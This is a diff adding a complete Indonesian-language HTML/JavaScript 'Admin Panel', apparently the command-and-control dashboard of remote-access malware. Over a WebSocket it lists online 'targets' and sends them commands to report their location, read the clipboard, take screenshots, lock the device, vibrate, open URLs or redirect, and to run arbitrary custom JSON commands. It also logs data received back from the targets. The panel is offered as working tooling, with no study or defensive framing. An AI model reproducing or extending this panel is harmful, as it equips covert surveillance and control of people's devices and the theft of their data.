@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>ADMIN PANEL v2</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;-webkit-tap-highlight-color:transparent}
+  :root{
+    --bg:#0a0a0f; --card:#12121c; --border:#1f1f2e; --txt:#e0e0e0;
+    --accent:#ff005c; --accent2:#ff9900; --green:#00f260;
+  }
+  body{background:var(--bg);color:var(--txt);height:100vh;overflow:hidden;display:flex;flex-direction:column;user-select:none}
+
+  /* SPLASH */
+  #splash{position:fixed;inset:0;background:linear-gradient(135deg,#1a0033,#0f0c29,#000);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;transition:opacity .6s}
+  #splash.hide{opacity:0;visibility:hidden}
+  .logo{font-size:38px;font-weight:900;letter-spacing:3px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:pulse 1.2s infinite alternate}
+  @keyframes pulse{from{transform:scale(1)}to{transform:scale(1.08)}}
+  .sub{margin-top:10px;color:var(--accent);font-size:12px;letter-spacing:4px}
+  #bar{margin-top:26px;width:200px;height:4px;background:#1a1a2e;border-radius:4px;overflow:hidden}
+  #barFill{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .3s}
+
+  /* HEADER */
+  header{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:var(--card);border-bottom:1px solid var(--border);z-index:10}
+  header h1{font-size:15px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  .status{font-size:10px;color:var(--green);display:flex;align-items:center;gap:6px}
+  .dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:blink 1s infinite}
+  .dot.off{background:var(--accent)}
+  @keyframes blink{50%{opacity:.3}}
+
+  /* MAIN */
+  main{flex:1;overflow-y:auto;padding:14px;padding-bottom:90px}
+  .page{display:none;animation:fade .25s}
+  .page.active{display:block}
+  @keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:12px}
+  .card h2{font-size:13px;color:#aaa;margin-bottom:10px;font-weight:600;display:flex;justify-content:space-between;align-items:center}
+  .card h2 .badge{background:var(--accent);color:#fff;font-size:10px;padding:2px 8px;border-radius:20px}
+
+  /* HOME */
+  .stats{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px}
+  .stat .num{font-size:26px;font-weight:800;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  .stat .lbl{font-size:11px;color:#888;margin-top:2px}
+  .stat .ico{font-size:20px;margin-bottom:6px}
+
+  /* CMD */
+  .cmd{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+  .cmd button{padding:12px 6px;border:none;border-radius:10px;background:#1e1e2e;color:#ccc;font-size:12px;font-weight:600;cursor:pointer;transition:.15s;display:flex;flex-direction:column;align-items:center;gap:4px}
+  .cmd button span:first-child{font-size:18px}
+  .cmd button:active{transform:scale(.95);background:var(--accent);color:#fff}
+
+  textarea,input,select{width:100%;background:#0a0a12;border:1px solid var(--border);border-radius:10px;color:var(--green);font-family:monospace;font-size:12px;padding:10px;outline:none;margin-top:6px}
+  textarea{height:70px;resize:none}
+  input{height:42px}
+  select{height:42px;color:#ccc;font-family:'Segoe UI'}
+
+  .send{margin-top:8px;width:100%;padding:12px;border:none;border-radius:10px;background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;font-weight:700;font-size:14px;cursor:pointer}
+  .send:active{transform:scale(.97)}
+
+  /* TARGET */
+  .tag{display:inline-flex;align-items:center;gap:6px;background:#1e1e2e;border:1px solid var(--accent);color:var(--accent2);padding:6px 12px;border-radius:20px;font-size:11px;margin:4px;font-family:monospace;cursor:pointer;transition:.15s}
+  .tag.selected{background:var(--accent);color:#fff}
+  .tag .dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 1s infinite}
+
+  /* LOG */
+  #logBox{background:#0a0a12;border:1px solid var(--border);border-radius:10px;padding:10px;font-family:monospace;font-size:11px;color:var(--green);height:calc(100vh - 250px);overflow-y:auto;white-space:pre-wrap;word-break:break-word}
+  .log-line{padding:3px 0;border-bottom:1px dashed #1a1a2e}
+  .log-line .t{color:#555;font-size:10px}
+  .log-line.err{color:var(--accent)}
+  .log-line.ok{color:var(--green)}
+  .log-line.warn{color:var(--accent2)}
+
+  /* SETTINGS */
+  .row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--border)}
+  .row:last-child{border-bottom:none}
+  .row .l{font-size:13px;color:#ccc}
+  .row .d{font-size:11px;color:#666;margin-top:2px}
+  .switch{width:46px;height:26px;background:#1e1e2e;border-radius:20px;position:relative;cursor:pointer;transition:.2s;flex-shrink:0}
+  .switch.on{background:var(--green)}
+  .switch::after{content:'';position:absolute;top:3px;left:3px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s}
+  .switch.on::after{left:23px}
+
+  .btn-mini{padding:8px 14px;border:none;border-radius:8px;background:#1e1e2e;color:#ccc;font-size:12px;cursor:pointer}
+  .btn-mini:active{background:var(--accent);color:#fff}
+
+  /* BOTTOM NAV */
+  nav{position:fixed;bottom:0;left:0;right:0;background:var(--card);border-top:1px solid var(--border);display:grid;grid-template-columns:repeat(5,1fr);padding:8px 0;z-index:20}
+  nav button{background:none;border:none;color:#666;font-size:10px;display:flex;flex-direction:column;align-items:center;gap:3px;cursor:pointer;padding:6px 0;transition:.2s}
+  nav button span:first-child{font-size:20px}
+  nav button.active{color:var(--accent2)}
+  nav button:active{transform:scale(.9)}
+
+  .toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:var(--accent);color:#fff;padding:10px 20px;border-radius:20px;font-size:12px;font-weight:600;z-index:9999;opacity:0;transition:.3s;pointer-events:none}
+  .toast.show{opacity:1;bottom:110px}
+</style>
+</head>
+<body>
+
+<!-- SPLASH -->
+<div id="splash">
+  <div class="logo">ADMIN</div>
+  <div class="sub">CONTROL PANEL v2</div>
+  <div id="bar"><div id="barFill"></div></div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <h1>⚡ ADMIN PANEL</h1>
+  <div class="status"><span class="dot" id="dot"></span><span id="stat">CONNECTING</span></div>
+</header>
+
+<!-- MAIN -->
+<main>
+
+  <!-- PAGE: HOME -->
+  <section class="page active" id="page-home">
+    <div class="stats">
+      <div class="stat">
+        <div class="ico">🟢</div>
+        <div class="num" id="sTargets">0</div>
+        <div class="lbl">Target Online</div>
+      </div>
+      <div class="stat">
+        <div class="ico">📡</div>
+        <div class="num" id="sCmds">0</div>
+        <div class="lbl">Perintah Terkirim</div>
+      </div>
+      <div class="stat">
+        <div class="ico">📥</div>
+        <div class="num" id="sRecv">0</div>
+        <div class="lbl">Data Diterima</div>
+      </div>
+      <div class="stat">
+        <div class="ico">⏱️</div>
+        <div class="num" id="sUptime">0</div>
+        <div class="lbl">Uptime (menit)</div>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:12px">
+      <h2>Aksi Cepat <span class="badge" id="selInfo">SEMUA</span></h2>
+      <div class="cmd">
+        <button onclick="quick('PING')"><span>📡</span><span>PING</span></button>
+        <button onclick="quick('GET_LOCATION')"><span>📍</span><span>LOKASI</span></button>
+        <button onclick="quick('VIBRATE')"><span>📳</span><span>VIBRATE</span></button>
+        <button onclick="quick('ALERT')"><span>⚠️</span><span>ALERT</span></button>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Aktivitas Terakhir</h2>
+      <div id="homeLog" style="font-family:monospace;font-size:11px;color:#888;max-height:180px;overflow-y:auto">-</div>
+    </div>
+  </section>
+
+  <!-- PAGE: TARGETS -->
+  <section class="page" id="page-targets">
+    <div class="card">
+      <h2>Daftar Target <span class="badge" id="targetCount">0</span></h2>
+      <div id="targets" style="min-height:60px">Belum ada target online</div>
+      <button class="send" style="margin-top:10px" onclick="selectAll()">🎯 PILIH SEMUA</button>
+    </div>
+    <div class="card">
+      <h2>Info Target Terpilih</h2>
+      <div id="infoTarget" style="font-size:12px;color:#888;font-family:monospace">Pilih target dulu...</div>
+    </div>
+  </section>
+
+  <!-- PAGE: COMMAND -->
+  <section class="page" id="page-command">
+    <div class="card">
+      <h2>Kirim Ke <span class="badge" id="cmdTargetInfo">SEMUA</span></h2>
+      <select id="targetSelect">
+        <option value="all">📢 SEMUA TARGET</option>
+      </select>
+    </div>
+
+    <div class="card">
+      <h2>Perintah Cepat</h2>
+      <div class="cmd">
+        <button onclick="quick('PING')"><span>📡</span><span>PING</span></button>
+        <button onclick="quick('GET_LOCATION')"><span>📍</span><span>LOKASI</span></button>
+        <button onclick="quick('GET_CLIPBOARD')"><span>📋</span><span>CLIPBOARD</span></button>
+        <button onclick="quick('VIBRATE')"><span>📳</span><span>VIBRATE</span></button>
+        <button onclick="quick('ALERT')"><span>⚠️</span><span>ALERT</span></button>
+        <button onclick="quick('LOCK')"><span>🔒</span><span>LOCK</span></button>
+        <button onclick="quick('SCREENSHOT')"><span>📸</span><span>SCREENSHOT</span></button>
+        <button onclick="quick('OPEN_URL')"><span>🌐</span><span>OPEN URL</span></button>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Perintah Custom (JSON)</h2>
+      <textarea id="custom" placeholder='{"cmd":"alert","msg":"Halo target"}'></textarea>
+      <button class="send" onclick="sendCustom()">🚀 KIRIM</button>
+    </div>
+
+    <div class="card">
+      <h2>Kirim Teks / Pesan</h2>
+      <input id="textMsg" placeholder="Tulis pesan teks..." />
+      <button class="send" onclick="sendText()">💬 KIRIM TEKS</button>
+    </div>
+
+    <div class="card">
+      <h2>Redirect URL</h2>
+      <input id="urlMsg" placeholder="https://example.com" />
+      <button class="send" onclick="sendUrl()">🌐 REDIRECT</button>
+    </div>
+  </section>
+
+  <!-- PAGE: LOG -->
+  <section class="page" id="page-log">
+    <div class="card">
+      <h2>Log Aktivitas <button class="btn-mini" onclick="clearLog()">🗑️ CLEAR</button></h2>
+      <div id="logBox">Sistem siap...</div>
+    </div>
+  </section>
+
+  <!-- PAGE: SETTINGS -->
+  <section class="page" id="page-settings">
+    <div class="card">
+      <h2>Server</h2>
+      <div class="row">
+        <div>
+          <div class="l">Auto Reconnect</div>
+          <div class="d">Sambung ulang otomatis saat putus</div>
+        </div>
+        <div class="switch on" id="sw-reconnect" onclick="toggleSw('reconnect')"></div>
+      </div>
+      <div class="row">
+        <div>
+          <div class="l">Sound Notif</div>
+          <div class="d">Bunyi saat ada target online</div>
+        </div>
+        <div class="switch" id="sw-sound" onclick="toggleSw('sound')"></div>
+      </div>
+      <div class="row">
+        <div>
+          <div class="l">Vibrate Notif</div>
+          <div class="d">Getar saat ada aktivitas</div>
+        </div>
+        <div class="switch" id="sw-vibrate" onclick="toggleSw('vibrate')"></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Info</h2>
+      <div class="row">
+        <div>
+          <div class="l">Server URL</div>
+          <div class="d" id="srvUrl">-</div>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <div class="l">Versi</div>
+          <div class="d">v2.0.0</div>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <div class="l">Status</div>
+          <div class="d" id="connStatus">-</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>Aksi</h2>
+      <button class="send" onclick="reconnect()">🔄 RECONNECT</button>
+      <button class="send" style="background:#1e1e2e;color:#ccc;margin-top:8px" onclick="clearLog()">🗑️ HAPUS LOG</button>
+    </div>
+  </section>
+
+</main>
+
+<!-- BOTTOM NAV -->
+<nav>
+  <button class="active" onclick="switchPage('home', this)"><span>🏠</span><span>Home</span></button>
+  <button onclick="switchPage('targets', this)"><span>🎯</span><span>Target</span></button>
+  <button onclick="switchPage('command', this)"><span>⚡</span><span>Command</span></button>
+  <button onclick="switchPage('log', this)"><span>📜</span><span>Log</span></button>
+  <button onclick="switchPage('settings', this)"><span>⚙️</span><span>Setting</span></button>
+</nav>
+
+<div class="toast" id="toast">-</div>
+
+<script>
+  /* ============ SPLASH ============ */
+  const splash = document.getElementById('splash');
+  const barFill = document.getElementById('barFill');
+  let p = 0;
+  const iv = setInterval(() => {
+    p += Math.random()*20;
+    if(p>=100){p=100;barFill.style.width='100%';clearInterval(iv);
+      setTimeout(()=>splash.classList.add('hide'),300);}
+    else barFill.style.width=p+'%';
+  },150);
+
+  /* ============ STATE ============ */
+  const state = {
+    ws: null,
+    connected: false,
+    targets: new Set(),
+    selected: new Set(),
+    cmdCount: 0,
+    recvCount: 0,
+    startTime: Date.now(),
+    settings: { reconnect: true, sound: false, vibrate: false },
+    history: []
+  };
+
+  /* ============ TOAST ============ */
+  function toast(msg){
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(t._t);
+    t._t = setTimeout(()=>t.classList.remove('show'), 1800);
+  }
+
+  /* ============ NAV ============ */
+  function switchPage(id, btn){
+    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+    document.getElementById('page-'+id).classList.add('active');
+    document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+  }
+
+  /* ============ LOG ============ */
+  function log(msg, type='ok'){
+    const box = document.getElementById('logBox');
+    const t = new Date().toLocaleTimeString();
+    const line = document.createElement('div');
+    line.className = 'log-line ' + type;
+    line.innerHTML = `<span class="t">[${t}]</span> ${msg}`;
+    box.prepend(line);
+    if(box.children.length > 300) box.lastChild.remove();
+
+    // Home log
+    const hl = document.getElementById('homeLog');
+    hl.innerHTML = `<div style="color:#${type==='err'?'ff005c':type==='warn'?'ff9900':'00f260'}">[${t}] ${msg}</div>` + hl.innerHTML;
+    if(hl.children.length > 15) hl.lastChild.remove();
+
+    // Sound & vibrate
+    if(state.settings.vibrate && navigator.vibrate) navigator.vibrate(50);
+    if(state.settings.sound){
+      try{
+        const ctx = new (window.AudioContext||window.webkitAudioContext)();
+        const o = ctx.createOscillator();
+        const g = ctx.createGain();
+        o.connect(g); g.connect(ctx.destination);
+        o.frequency.value = 800; g.gain.value = 0.05;
+        o.start(); o.stop(ctx.currentTime + 0.08);
+      }catch(e){}
+    }
+  }
+
+  function clearLog(){
+    document.getElementById('logBox').innerHTML = 'Sistem siap...';
+    toast('Log dibersihkan');
+  }
+
+  /* ============ SWITCH ============ */
+  function toggleSw(k){
+    state.settings[k] = !state.settings[k];
+    document.getElementById('sw-'+k).classList.toggle('on', state.settings[k]);
+    toast(`${k}: ${state.settings[k]?'ON':'OFF'}`);
+  }
+
+  /* ============ WEBSOCKET ============ */
+  function connect(){
+    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+    const url = `${proto}://${location.host}/admin`;
+    document.getElementById('srvUrl').textContent = url;
+
+    try{
+      state.ws = new WebSocket(url);
+    }catch(e){ log('Gagal buat socket: '+e.message,'err'); return; }
+
+    state.ws.onopen = () => {
+      state.connected = true;
+      document.getElementById('dot').classList.remove('off');
+      document.getElementById('stat').textContent = 'ONLINE';
+      document.getElementById('connStatus').textContent = 'Terhubung';
+      log('Admin terhubung ke server','ok');
+      toast('Terhubung ke server');
+    };
+
+    state.ws.onclose = () => {
+      state.connected = false;
+      document.getElementById('dot').classList.add('off');
+      document.getElementById('stat').textContent = 'OFFLINE';
+      document.getElementById('connStatus').textContent = 'Terputus';
+      log('Koneksi terputus','err');
+      if(state.settings.reconnect){
+        setTimeout(connect, 3000);
+      }
+    };
+
+    state.ws.onerror = () => log('Error koneksi','err');
+
+    state.ws.onmessage = (e) => {
+      let d;
+      try { d = JSON.parse(e.data); }
+      catch { d = { type: 'raw', data: e.data }; }
+
+      if(d.type === 'init'){
+        d.targets.forEach(id=>state.targets.add(id));
+        state.history = d.history || [];
+        renderTargets();
+        log(`Init: ${d.targets.length} target online`,'ok');
+      }
+      else if(d.type === 'target_online'){
+        state.targets.add(d.id);
+        renderTargets();
+        log(`🟢 Target online: ${d.id}`,'ok');
+        toast('Target online: '+d.id);
+      }
+      else if(d.type === 'target_offline'){
+        state.targets.delete(d.id);
+        state.selected.delete(d.id);
+        renderTargets();
+        log(`🔴 Target offline: ${d.id}`,'warn');
+      }
+      else if(d.type === 'target_data'){
+        state.recvCount++;
+        document.getElementById('sRecv').textContent = state.recvCount;
+        const text = d.data || JSON.stringify(d);
+        log(`📥 [${d.id}] ${text}`,'ok');
+      }
+      else if(d.type === 'log'){
+        if(d.sentTo) log(`📤 CMD "${d.data}" → ${d.sentTo.join(', ')||'tidak ada'}`,'warn');
+      }
+      else {
+        log('📩 '+JSON.stringify(d),'ok');
+      }
+    };
+  }
+
+  function reconnect(){
+    if(state.ws) state.ws.close();
+    setTimeout(connect, 500);
+    toast('Reconnecting...');
+  }
+
+  /* ============ TARGETS ============ */
+  function renderTargets(){
+    const arr = [...state.targets];
+    document.getElementById('targetCount').textContent = arr.length;
+    document.getElementById('sTargets').textContent = arr.length;
+
+    const box = document.getElementById('targets');
+    if(!arr.length){
+      box.innerHTML = '<div style="color:#666;font-size:12px;padding:10px">Belum ada target online</div>';
+    } else {
+      box.innerHTML = arr.map(id=>{
+        const sel = state.selected.has(id) ? 'selected' : '';
+        return `<span class="tag ${sel}" onclick="toggleSelect('${id}')"><span class="dot"></span>${id}</span>`;
+      }).join('');
+    }
+
+    // Update select dropdown
+    const sel = document.getElementById('targetSelect');
+    const cur = sel.value;
+    sel.innerHTML = '<option value="all">📢 SEMUA TARGET</option>' +
+      arr.map(id=>`<option value="${id}">🎯 ${id}</option>`).join('');
+    sel.value = arr.includes(cur) ? cur : 'all';
+
+    // Info target
+    const info = document.getElementById('infoTarget');
+    if(state.selected.size){
+      info.innerHTML = [...state.selected].map(id=>`<div>🎯 ID: <b style="color:#ff9900">${id}</b></div>`).join('');
+    } else {
+      info.textContent = 'Pilih target dulu...';
+    }
+  }
+
+  function toggleSelect(id){
+    if(state.selected.has(id)) state.selected.delete(id);
+    else state.selected.add(id);
+    renderTargets();
+    updateSelInfo();
+  }
+
+  function selectAll(){
+    if(state.selected.size === state.targets.size){
+      state.selected.clear();
+    } else {
+      state.selected = new Set(state.targets);
+    }
+    renderTargets();
+    updateSelInfo();
+    toast(state.selected.size ? `Pilih ${state.selected.size} target` : 'Batal pilih');
+  }
+
+  function updateSelInfo(){
+    const info = document.getElementById('selInfo');
+    info.textContent = state.selected.size ? [...state.selected].join(', ') : 'SEMUA';
+    document.getElementById('cmdTargetInfo').textContent =
+      state.selected.size ? [...state.selected].join(', ') : 'SEMUA';
+  }
+
+  /* ============ SEND ============ */
+  function send(data, to){
+    if(!state.connected){
+      toast('Belum terhubung!');
+      log('Gagal kirim, belum terhubung','err');
+      return false;
+    }
+    const target = to || (state.selected.size === 1 ? [...state.selected][0] : 'all');
+    state.ws.send(JSON.stringify({ type:'cmd', to: target, data: data }));
+    state.cmdCount++;
+    document.getElementById('sCmds').textContent = state.cmdCount;
+    return true;
+  }
+
+  function quick(cmd){
+    const sel = document.getElementById('targetSelect').value;
+    if(send(cmd, sel)) toast('CMD: '+cmd);
+  }
+
+  function sendCustom(){
+    const val = document.getElementById('custom').value.trim();
+    if(!val) return toast('Isi dulu!');
+    const sel = document.getElementById('targetSelect').value;
+    if(send(val, sel)){ toast('Custom terkirim'); document.getElementById('custom').value=''; }
+  }
+
+  function sendText(){
+    const v = document.getElementById('textMsg').value.trim();
+    if(!v) return toast('Isi teks!');
+    const payload = JSON.stringify({ cmd:'text', msg:v });
+    const sel = document.getElementById('targetSelect').value;
+    if(send(payload, sel)){ toast('Teks terkirim'); document.getElementById('textMsg').value=''; }
+  }
+
+  function sendUrl(){
+    const v = document.getElementById('urlMsg').value.trim();
+    if(!v) return toast('Isi URL!');
+    const payload = JSON.stringify({ cmd:'redirect', url:v });
+    const sel = document.getElementById('targetSelect').value;
+    if(send(payload, sel)){ toast('URL terkirim'); document.getElementById('urlMsg').value=''; }
+  }
+
+  /* ============ UPTIME ============ */
+  setInterval(()=>{
+    const m = Math.floor((Date.now() - state.startTime) / 60000);
+    document.getElementById('sUptime').textContent = m;
+  }, 1000);
+
+  /* ============ INIT ============ */
+  connect();
+  renderTargets();
+  updateSelInfo();
+
+  document.addEventListener('gesturestart', e=>e.preventDefault());
+  document.addEventListener('contextmenu', e=>e.preventDefault());
+</script>
+
+</body>
+</html>
